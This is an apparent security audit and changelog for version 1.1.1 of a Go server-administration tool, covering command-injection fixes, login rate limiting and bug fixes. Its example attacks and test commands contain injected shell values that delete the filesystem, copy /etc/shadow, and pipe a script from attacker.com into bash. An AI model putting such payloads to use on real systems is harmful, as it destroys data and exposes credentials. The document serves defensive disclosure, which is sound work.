# Security Audit and Bug Fixes - v1.1.1

## 🔒 Security Vulnerabilities Fixed

### 1. **CRITICAL: Command Injection in Network/Firewall Operations**

**Risk Level:** HIGH  
**CVE:** N/A (Internal discovery)

**Affected Functions:**
- `network.AllowPort()` - Firewall port allow
- `network.DenyPort()` - Firewall port deny
- `network.DeleteRule()` - Firewall rule deletion
- `network.SetInterfaceUp/Down()` - Network interface control
- `network.AddIPAddress()` - IP address configuration
- `network.AddRoute()` - Routing table manipulation
- `network.DeleteRoute()` - Route deletion
- `network.SaveInterfaceConfig()` - Persistent network config
- `network.DeleteInterfaceConfig()` - Config file deletion

**Vulnerability:**
User input was passed directly to shell commands without validation, allowing potential command injection attacks.

**Example Attack:**
```bash
# Malicious port input
port = "80; rm -rf /; #"
# Would execute: ufw allow 80; rm -rf /; #/tcp
```

**Fix:**
Added comprehensive input validation functions:
- `isValidInterfaceName()` - Validates interface names (eth0, wlan0, etc.)
- `isValidPort()` - Validates port numbers and ranges
- `isValidProtocol()` - Validates protocol (tcp/udp/any)
- `isValidRuleNumber()` - Validates UFW rule numbers
- `isValidIPAddress()` - Validates IP addresses with CIDR notation
- `isValidIP()` - Validates plain IP addresses

All functions now reject any input containing shell metacharacters.

---

### 2. **CRITICAL: Command Injection in Service Operations**

**Risk Level:** HIGH

**Affected Functions:**
- `services.Start()` - Service start
- `services.Stop()` - Service stop
- `services.Restart()` - Service restart
- `services.Enable()` - Service enable
- `services.Disable()` - Service disable
- `services.GetStatus()` - Service status
- `services.GetLogs()` - Service logs

**Vulnerability:**
Systemd unit names were not validated before being passed to systemctl/journalctl.

**Example Attack:**
```bash
# Malicious unit name
unit = "sshd.service; cat /etc/shadow > /tmp/pwned; #"
```

**Fix:**
Added `isValidUnitName()` validation:
- Allows only alphanumeric, dash, underscore, dot, @, colon
- Maximum length: 256 characters
- Rejects all shell metacharacters

---

### 3. **CRITICAL: Command Injection in User Management**

**Risk Level:** HIGH

**Affected Functions:**
- `users.Create()` - User creation
- `users.Delete()` - User deletion
- `users.Lock()` - Lock user account
- `users.Unlock()` - Unlock user account
- `users.ChangePassword()` - Password change

**Vulnerability:**
Usernames were not validated before being used in system commands.

**Example Attack:**
```bash
# Malicious username
username = "testuser; curl attacker.com/shell.sh | bash; #"
```

**Fix:**
Added `isValidUsername()` validation:
- Allows only lowercase letters, digits, dash, underscore
- First character must be letter or underscore
- Maximum length: 32 characters
- Follows Linux username conventions

---

### 4. **MEDIUM: No Rate Limiting on Login Endpoint**

**Risk Level:** MEDIUM

**Vulnerability:**
Login endpoint had no rate limiting, allowing brute-force attacks.

**Attack Scenario:**
Attacker could make unlimited login attempts to guess passwords.

**Fix:**
Implemented IP-based rate limiting:
- Maximum 5 failed attempts per IP
- 15-minute lockout period
- Automatic cleanup of old attempts
- Rate limit reset on successful login
- Supports X-Forwarded-For and X-Real-IP headers for proxies

**New File:** `internal/auth/ratelimit.go`

---

### 5. **LOW: Weak Session Secret Generation**

**Risk Level:** LOW

**Vulnerability:**
Session secret could theoretically be too short if misconfigured.

**Fix:**
- Enforced minimum 32-byte session secret in `auth.Init()`
- Automatic padding if secret is too short
- Already using crypto/rand for generation (64 chars in setup)

---

## 🐛 Bugs Fixed

### Bug #1: Incorrect Integer to String Conversion in GetLogs()

**Location:** `internal/services/services.go:75`

**Issue:**
```go
linesStr = string(rune(lines))  // ❌ WRONG!
// string(rune(50)) = "2" (Unicode character 50)
```

**Fix:**
```go
linesStr = fmt.Sprintf("%d", lines)  // ✅ CORRECT
// fmt.Sprintf("%d", 50) = "50"
```

**Impact:** Service logs were showing incorrect number of lines.

---

### Bug #2: Password Not Set During User Creation

**Location:** `internal/users/users.go:64`

**Issue:**
```go
_, err = util.RunCommand("chpasswd")
// TODO: pipe password through stdin
```

Password was never actually set because stdin wasn't piped to chpasswd.

**Fix:**
```go
cmd := exec.Command("sudo", "-n", "chpasswd")
cmd.Stdin = bytes.NewBufferString(username + ":" + password)
if err := cmd.Run(); err != nil {
    return fmt.Errorf("failed to set password: %v", err)
}
```

**Impact:** Created users had no passwords and couldn't log in.

---

### Bug #3: Missing Error Handling in handlePackagesUpdate()

**Location:** `internal/api/packages.go:70`

**Issue:**
```go
json.NewDecoder(r.Body).Decode(&req)  // Error ignored!
```

**Fix:**
```go
if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
    h.writeError(w, "Invalid request", http.StatusBadRequest)
    return
}
```

**Impact:** Malformed JSON requests were silently accepted.

---

## 📊 Security Audit Summary

| Category | Found | Fixed |
|----------|-------|-------|
| **Critical Vulnerabilities** | 3 | 3 ✅ |
| **Medium Vulnerabilities** | 1 | 1 ✅ |
| **Low Vulnerabilities** | 1 | 1 ✅ |
| **Bugs** | 3 | 3 ✅ |
| **Total Issues** | **8** | **8** ✅ |

---

## 🛡️ Security Best Practices Implemented

1. ✅ **Input Validation** - All user inputs validated before shell execution
2. ✅ **Rate Limiting** - Login brute-force protection
3. ✅ **Session Security** - Strong session secrets (64 chars, crypto/rand)
4. ✅ **HTTP-Only Cookies** - Session cookies not accessible via JavaScript
5. ✅ **Bcrypt Password Hashing** - Strong password hashing (DefaultCost = 10)
6. ✅ **Command Sanitization** - No shell metacharacters allowed in inputs
7. ✅ **File Permission Security** - Config files saved with 0600 permissions
8. ✅ **Stdin Piping** - Passwords piped through stdin, not command line

---

## 🔄 Files Modified

### Security Fixes:
- `internal/network/network.go` - Added validation for all network operations
- `internal/services/services.go` - Added validation for systemd operations
- `internal/users/users.go` - Added validation for user operations
- `internal/auth/auth.go` - Enhanced session secret validation
- `internal/auth/ratelimit.go` - **NEW** Rate limiting implementation
- `internal/api/auth.go` - Integrated rate limiting in login

### Bug Fixes:
- `internal/services/services.go` - Fixed int to string conversion
- `internal/users/users.go` - Fixed password setting via stdin
- `internal/api/packages.go` - Added error handling

---

## 🧪 Testing Recommendations

### Security Testing:
```bash
# Test command injection prevention
curl -X POST http://localhost:3333/api/network/firewall/allow \
  -H "Content-Type: application/json" \
  -d '{"port":"80; rm -rf /","protocol":"tcp"}'
# Expected: {"error":"invalid port: 80; rm -rf /"}

# Test rate limiting
for i in {1..6}; do
  curl -X POST http://localhost:3333/api/auth/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"wrong"}'
done
# Expected: 6th attempt returns 429 Too Many Requests
```

### Functional Testing:
```bash
# Test user creation with password
curl -X POST http://localhost:3333/api/users/create \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser","password":"testpass"}'
# Expected: User created with working password

# Test service logs with correct line count
curl http://localhost:3333/api/logs?unit=sshd.service&lines=100
# Expected: Returns ~100 lines (not garbled output)
```

---

## 📝 Upgrade Notes

All fixes are backward compatible. No configuration changes required.

Recommended actions after upgrade:
1. Review firewall rules for any anomalies
2. Test service management operations
3. Verify user password functionality
4. Monitor login attempts for rate limiting effectiveness

---

## 🙏 Credits

Security audit and fixes performed on November 11, 2025.

All vulnerabilities were discovered during internal code review before any public disclosure or exploitation.

---

**Version:** 1.1.1  
**Date:** November 11, 2025  
**Severity:** HIGH (Multiple critical command injection vulnerabilities)  
**Status:** ✅ ALL FIXED

